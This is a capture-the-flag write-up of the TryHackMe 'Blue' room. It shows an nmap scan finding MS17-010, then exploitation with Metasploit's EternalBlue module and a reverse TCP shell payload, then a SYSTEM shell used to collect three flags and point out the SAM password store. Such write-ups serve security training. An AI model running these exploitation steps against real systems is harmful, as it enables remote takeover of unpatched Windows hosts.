# Blue - THM

> Klismann Barros | February 27th, 2021

--------------------------------

First, as a way to facilitate everything, add to /etc/hosts: 

```shell
10.10.49.103    blue
```

## Nmap Scanning  - TERMINAL OUTPUT

### Command:

```shell
$ nmap -sC -sV -A -script vuln $blue

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-27 16:15 EST
Nmap scan report for 10.10.49.103
Host is up (0.20s latency).
Not shown: 983 closed ports
PORT      STATE    SERVICE            VERSION
135/tcp   open     msrpc              Microsoft Windows RPC
139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
444/tcp   filtered snpp
445/tcp   open     microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
1123/tcp  filtered murray
1163/tcp  filtered sddp
1658/tcp  filtered sixnetudr
2725/tcp  filtered msolap-ptp2
3389/tcp  open     ssl/ms-wbt-server?
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
9485/tcp  filtered unknown
49152/tcp open     msrpc              Microsoft Windows RPC
49153/tcp open     msrpc              Microsoft Windows RPC
49154/tcp open     msrpc              Microsoft Windows RPC
49158/tcp open     msrpc              Microsoft Windows RPC
49160/tcp open     msrpc              Microsoft Windows RPC
54045/tcp filtered unknown
55555/tcp filtered unknown
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 142.66 seconds
```

We can see that it is vulnerable to the MS17-010

><i>For further information about this vulnerability, click on the link: </i>
> <a href="https://www.trendmicro.com/en_us/research/17/f/ms17-010-eternalblue.html" target="_blanK">MS17-010</a>

So, let's exploit it

## Exploitation

```bash
$ msfconsole
```

This is the path for the exploitation code:

```bash
exploit/windows/smb/ms17_010_eternalblue
```

It says that we have to use this payload:

```bash
set payload windows/x64/shell/reverse_tcp
```

Now we have to fill the options that are missing.

And we gained the shell

```shell
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system <-

C:\Windows\system32>
```

Whohoa! We gained the system shell

### Now look after the flags

```shell
C:\Windows\System32>cd ..
cd ..

C:\Windows>cd ..
cd ..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  01:27 PM                24 flag1.txt
07/13/2009  09:20 PM    <DIR>          PerfLogs
04/12/2011  02:28 AM    <DIR>          Program Files
03/17/2019  04:28 PM    <DIR>          Program Files (x86)
12/12/2018  09:13 PM    <DIR>          Users
03/17/2019  04:36 PM    <DIR>          Windows
               1 File(s)             24 bytes
               5 Dir(s)  20,432,228,352 bytes free

C:\>
```

### First flag found!

An important thing to do, is to look were the password is stored on windows, so let's go.

```shell
C:\>cd Windows
cd Windows

C:\Windows>cd system32
cd system32

C:\Windows\System32>cd Config
cd Config

C:\Windows\System32\config>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Windows\System32\config

02/27/2021  01:43 PM    <DIR>          .
02/27/2021  01:43 PM    <DIR>          ..
12/12/2018  05:00 PM            28,672 BCD-Template
02/27/2021  01:53 PM        18,087,936 COMPONENTS
02/27/2021  02:13 PM           262,144 DEFAULT
03/17/2019  01:32 PM                34 flag2.txt
07/13/2009  08:34 PM    <DIR>          Journal
02/27/2021  02:12 PM    <DIR>          RegBack
02/27/2021  05:14 PM           262,144 SAM
02/27/2021  01:53 PM           262,144 SECURITY
02/27/2021  05:20 PM        40,632,320 SOFTWARE
02/27/2021  05:26 PM        12,582,912 SYSTEM
11/20/2010  08:41 PM    <DIR>          systemprofile
12/12/2018  05:03 PM    <DIR>          TxR
               8 File(s)     72,118,306 bytes
               6 Dir(s)  20,432,224,256 bytes free

C:\Windows\System32\config> 
```

### Normaly, passwords keeps stored at SAM, but we got the second flag.

Now let's go for the last one.

Always look after the users files.

```shell
C:\>cd Users
cd Users

C:\Users>cd Jon
cd Jon

C:\Users\Jon>cd Documents
cd Documents

C:\Users\Jon\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon\Documents

12/12/2018  09:49 PM    <DIR>          .
12/12/2018  09:49 PM    <DIR>          ..
03/17/2019  01:26 PM                37 flag3.txt
               1 File(s)             37 bytes
               2 Dir(s)  20,431,695,872 bytes free

C:\Users\Jon\Documents>
```

### And we got the 3rd and last flag.
